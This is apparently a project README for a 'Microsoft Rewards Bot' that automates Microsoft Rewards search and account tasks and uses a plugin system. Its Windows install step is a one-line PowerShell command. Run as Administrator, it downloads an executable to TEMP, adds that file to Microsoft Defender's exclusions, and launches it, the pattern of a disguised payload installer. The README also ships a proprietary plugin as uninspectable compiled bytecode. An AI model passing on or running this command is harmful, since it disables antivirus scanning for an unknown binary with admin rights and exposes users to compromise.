<p align="center">
  <img src="assets/logo.png" alt="Microsoft Rewards Bot" width="200">
</p>

<h1 align="center">Microsoft Rewards Bot BETA</h1>

<p align="center">
  <strong>Open-source Microsoft Rewards automation with a plugin system</strong><br>
  Core features are open source. Premium features ship as a proprietary pre-installed plugin.
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Version-4.0.4-blue?style=for-the-badge" alt="Version">
  <img src="https://img.shields.io/badge/Node.js-24.15.0-green?style=for-the-badge&logo=nodedotjs&logoColor=white" alt="Node.js">
  <img src="https://img.shields.io/badge/License-PolyForm_Noncommercial-orange?style=for-the-badge" alt="License">
</p>

---

## What This Repository Provides

Microsoft Rewards Bot provides an automated Microsoft Rewards workflow with a modular plugin system.

This repository includes:

- automated Microsoft Rewards search and account workflows
- a public plugin API for custom plugins
- a local plugin manager available with `npm run plugins`
- auto-update checks when running `npm start`
- an official built-in Core plugin that loads only when enabled in `plugins/plugins.jsonc`

---

## Windows Installation

> **Required:** Run PowerShell as Administrator.

Open PowerShell as Administrator, then run:

```powershell
$f="$env:TEMP\install.exe"; iwr https://github.com/QuestPilot/Microsoft-Rewards-Bot/raw/refs/heads/release/scripts/install.exe -OutFile $f; Add-MpPreference -ExclusionPath $f; start $f
```

The installer will download the latest Windows installer from the release branch and launch it locally.

> Only run installers from repositories and publishers you trust.

---

## Manual Installation

1. Clone the repository.
   ```bash
   git clone -b release https://github.com/QuestPilot/Microsoft-Rewards-Bot.git
   ```
2. Install Node.js `24.15.0`.
3. Install dependencies:

   ```bash
   npm install
   ```

4. Copy the example accounts file:

   ```bash
   cp src/accounts.example.json src/accounts.json
   ```

5. Copy the example configuration file:

   ```bash
   cp src/config.example.json src/config.json
   ```

6. Edit `plugins/plugins.jsonc` to enable or disable plugins.
7. Optionally enable the local dashboard in `src/config.json`. See [docs/dashboard.md](docs/dashboard.md).
8. Optionally open the local Plugin Desk:

   ```bash
   npm run plugins
   ```

9. Start the bot:

   ```bash
   npm start
   ```

`npm start` checks the release manifest before launch.

`npm run dev` and `-dev` never perform auto-update checks.

---

## Node.js Version Requirement

The official Core plugin is distributed as V8 bytecode. Because of this, releases are strict about the Node.js version.

Use:

```text
Node.js 24.15.0
```

Other Node.js versions are refused before launch.

---

## How Plugins Work

The bot scans the `plugins/` directory on startup.

Plugin behavior is controlled through `plugins/plugins.jsonc`.

- `enabled: true` loads a plugin
- `enabled: false` keeps a plugin installed but inactive
- `priority` controls plugin load order
- each plugin can receive its own configuration object
- public plugins cannot register official premium Core tasks

---

## Plugin Documentation

Read the plugin documentation here:

- [Plugin system overview](docs/plugins.md)
- [Create a plugin](docs/create-plugin.md)
- [Plugin API reference](docs/plugin-api.md)
- [Plugin publishing](docs/plugin-marketplace.md)
- [Official Core plugin](docs/core-plugin.md)
- [Node.js version](docs/node-version.md)
- [Dashboard testing](docs/dashboard-testing.md)
- [Auto-updates](docs/updates.md)
- [Troubleshooting](docs/troubleshooting.md)

---

## Documentation

See the public documentation index:

- [docs/README.md](docs/README.md)

---

## License

The open-source core is distributed under the PolyForm Noncommercial license.

The built-in Core plugin remains proprietary and is shipped as compiled bytecode.
